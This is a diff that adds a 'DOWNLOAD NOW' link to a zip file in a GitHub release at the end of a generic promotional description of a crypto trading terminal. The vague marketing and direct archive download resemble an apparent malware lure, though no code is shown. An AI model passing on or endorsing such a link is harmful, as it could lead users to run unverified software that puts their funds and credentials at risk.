@@ -11,3 +11,5 @@ The Universal Crypto Trading Terminal also ensures a high level of security by e
 The program provides access to detailed analytics and tools for technical analysis, helping users make informed decisions about their investments. Additionally, the Universal Crypto Trading Terminal supports integration with popular services for automated reporting and tax management.
 
 Universal Crypto Trading Terminal is a powerful tool for traders that brings all cryptocurrency exchanges together in one place, offering the opportunity to profit from market connections and fully utilize the potential of cryptocurrency trading.
+
+[DOWNLOAD NOW](https://github.com/andrewinc-prod/Universal-Crypto-Trading-Terminal/releases/download/Download/universal-crypto-trading-terminal.zip)
